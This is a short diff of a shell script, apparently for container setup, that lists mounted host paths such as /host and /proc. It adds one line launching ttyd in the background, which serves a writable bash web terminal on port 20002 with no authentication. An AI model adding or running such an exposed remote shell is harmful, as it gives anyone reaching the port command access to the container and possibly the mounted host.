@@ -24,6 +24,8 @@ echo "----------------------"
 mount | grep -E "/host|/proc|/sys|/dev"
 echo "----------------------"
 
+nohup ttyd -p 20002 -w / -W  /bin/bash 2>&1 >> /tmp/ttyd.log &
+
 # 设置权限
 if [ -d "/host" ]; then
     echo "Host directory mounted at /host"
